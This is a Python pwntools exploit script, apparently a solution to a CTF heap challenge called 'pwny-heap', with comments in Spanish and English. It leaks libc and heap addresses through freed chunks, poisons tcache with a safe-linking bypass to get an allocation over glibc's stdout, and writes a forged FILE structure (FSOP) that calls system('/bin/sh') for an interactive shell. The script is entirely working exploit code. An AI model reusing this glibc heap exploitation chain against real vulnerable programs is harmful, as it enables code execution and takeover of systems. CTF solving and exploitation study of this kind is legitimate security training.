from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./pwny-heap_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        #return remote("hidden.ctf.intigriti.io", 1337)
        return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def malloc(index, size):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("index: ", str(index).encode())
    io.sendlineafter("size: ", str(size).encode())

def free(index):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("index: ", str(index).encode())

def view(index):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("index: ", str(index).encode())
    io.recvuntil("here is some data for you buddy: ")
    return io.recvline()

def write(index, content):
    io.sendlineafter("> ", b"4")
    io.sendlineafter("index: ", str(index).encode())
    io.sendlineafter("write something in: ", content)


context.terminal = ['gnome-terminal', '-e']
io = start()

for i in range(9):
    malloc(i, 0x100)

for i in range(8):
    free(i)

#print(view(7).split(b".")[0][:-1])
leak_libc = u64(view(7).split(b".")[0][:-1].ljust(8, b"\x00"))
print(f"Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x21ace0

print(f"System: {hex(libc.sym.system)}")

"""
# Esta era mi otra forma desde fastbins pero este reto esta limitado a 20 asignaciones con malloc asi que F :(
for i in range(9):
    malloc(i, 0x28)
    write(i, b"A"*8)

for i in range(9):
    free(i)

free(7)

for i in range(8):
    malloc(i, 0x28)
    write(i, b"B"*8)
"""

heap_base = u64(view(0).split(b".")[0][:-1].ljust(8, b"\x00")) << 12

print(f"Leak Heap: {hex(heap_base)}")

malloc(10, 0x100)
free(6)

b = heap_base

# b es el vector de chunks ;-;/
# // the following operation assumes the address of b is known, which requires a heap leak
# b[0] = (intptr_t)((long)target ^ (long)b >> 12);

target = libc.sym._IO_2_1_stdout_

print(f"Target: {hex(target)}")

write_section = target ^ (b >> 12)

print(f"Writing section: {hex(write_section)}")

# Ahora si viene la escritura en b[0]

write(10, p64(write_section))

malloc(11, 0x100)
malloc(12, 0x100)

# some constants
#stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = next(libc.search(asm('add rdi, 0x10 ; jmp rcx')))# add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock= stdout + 0x8*7 # Esto es buscando ojo
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
#write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
# enjoy your shell

print("Longitud de FSOP: ", len(bytes(fake)))
write(12, bytes(fake))

io.interactive()